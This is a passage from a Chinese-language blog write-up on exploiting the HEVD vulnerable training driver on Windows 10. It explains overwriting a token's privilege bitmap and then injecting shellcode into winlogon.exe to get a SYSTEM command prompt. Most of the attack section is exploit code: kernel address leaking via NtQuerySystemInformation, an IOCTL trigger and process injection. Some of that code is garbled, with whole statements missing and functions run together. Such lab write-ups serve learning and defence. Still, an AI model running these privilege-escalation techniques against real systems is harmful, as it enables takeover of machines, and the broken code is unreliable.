得到TOKEN的地址之后，我们就能够拿到`_TOKEN`结构体中偏移地址为`0x40`的结构体`_SEP_TOKEN_PRIVILEGES`。之后我们来看一下这个结构体的形式：
    nt!_SEP_TOKEN_PRIVILEGES
       +0x000 Present          : Uint8B
       +0x008 Enabled          : Uint8B
       +0x010 EnabledByDefault : Uint8B
此时`Present`表示的是这个token中被开启的特权，而`Enabled`中表示的是当前token中 **被允许的特权**
。这三个变量都是以bitmap的形式存在的。  
在[之前提到的这篇文章中](http://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf)，作者发现，其实Windows并不会check一个token的`Present`值，而是check`Enabled`这个位置上对应的特权的bit有没有被置为1，来证明其权限是否打开了。所以这里我们就能够简单的利用这一点，将这个变量修改为-1，从而让当前的token获得最高的权限。  
分析至此，我们就能够知道，最终我们提权需要作的写入操作为:
    *(kTOKEN_addr + 0x48) = -1
####  3.2.2 最后的提权操作
当我们能够获得当前token的全部特权的时候，实际上相当于我们 **当前已经完成提权了** （所有的特权，不就是最高的权限嘛 : )
）。不过为了证明我们确实完成了提权，我们还是尝试弹出一个用户为systemd的cmd来证明我们已经完成了提权。  
谈到要创建一个用户为system的cmd，那么最容易想到的就是 **让一个system用户的进程创建一个cmd进程**
，此时子进程会继承父进程的用户，所以正好就是一个system权限的cmd。  
在之前HEVD的练习中，因为拷贝了TOKEN，所以发起攻击的r3进程的用户就被当成了system，所以直接在exp中创建cmd进程即可。不过这次的攻击的token是原先用户的token，至少用whoami看起来并不是system。不过这里为了有system权限的cmd也很简单，我们只要向system用户创建的进程（比方说，pid=4的system进程）远程注入用于创建cmd的shellcode即可~
于是这边就有了最后的提权操作：
    DWORD GetKernelPointer(HANDLE handle, DWORD type)
    {
        PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);
        DWORD outBuffer = 0;
        NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);
        if (status == STATUS_INFO_LENGTH_MISMATCH)
        {
            free(buffer);
            buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
            status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
        }
        if (!buffer)
        {
            printf("[-] NtQuerySystemInformation error \n");
            return 0;
        }
        for (size_t i = 0; i NumberOfHandles; i++)
        {
            DWORD objTypeNumber = buffer->Handels[i].ObjectTypeNumber;
            if (buffer->Handels[i].ProcessId == GetCurrentProcessId() && buffer->Handels[i].ObjectTypeNumber == type)
            {
                if (handle == (HANDLE)buffer->Handels[i].Handle)
                {
                    //printf("%p %d %x\n", buffer->Handels[i].Object, buffer->Handels[i].ObjectTypeNumber, buffer->Handels[i].Handle);
                    DWORD object = (DWORD)buffer->Handels[i].Object;
                    free(buffer);
                    return object;
                }
            }
        }
        printf("[-] handle not found\n");
        free(buffer);
        return 0;
    }
    void InjectToWinlogon()
    {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
        int pid = -1;
        if (Process32First(snapshot, &entry))
        {
            while (Process32Next(snapshot, &entry))
            {
                if (_wcsicmp(entry.szExeFile, L"winlogon.exe") == 0)
                {
                    pid = entry.th32ProcessID;
                    break;
                }
            }
        }
        CloseHandle(snapshot);
        if (pid Where = (ULONG_PTR)dwTargetOffset;
        //std::cout What = (ULONG_PTR)&uAllPrivelage;
        // WWW->What = (ULONG)&dwRealExAllocatePool;
        // copy exp to target address
        std::cout Where What) << std::endl;
        // send IOCTL to trigger 
        OutputDebugString(L"[+]  =========== Kernel Mode  =============== [+]");
        DeviceIoControl(hDev, dwCTLCode, WWW, sizeof(WrtieWhatWhere), NULL, NULL, &dwRetSize, NULL);
        OutputDebugString(L"[+]  =========== IOCTL Finish =============== [+]");
        std::cout << " IOCTL FIINISH "<<std::endl;
        // Tro to inject code
        InjectToWinlogon();
        HeapFree(GetProcessHeap(), 0, WWW);
        return;
    }
这里附上一个成功的截图 : )  
## 4\. 一些思考
###  关于HEVD
  * 个人认为是一个很不错的逼迫自己学习的工具，毕竟很多时候人都会懒，以做题目的形式学习比较能够比较有驱动力。
  * HEVD毕竟也是一个比较老的教程了，里面有一些攻击在win10上似乎是难以利用，如果向我这样死磕较新版本的时候，往往会被卡特别久（虽然这次找到了一个非常巧妙的利用方式，不过也因此没有仔细了解过去版本中的一些利用，例如gdiobject实现的提权之类的）
###  关于内核漏洞
  * Windows 内核确实越来越安全，从做题查到的WP来看，Win7的WP非常五花八门，而到了Win10基本上就只有寥寥几篇，侧面也是应证了内核能够被利用的方式确实变少了
  * 漏洞利用有时候非常像是在做数学题，思路一旦想通了一切都变得简单起来，但是很多时候是自己并不知道那种利用方式，所以在某个思路上面钻了牛角尖，这点会非常浪费时间。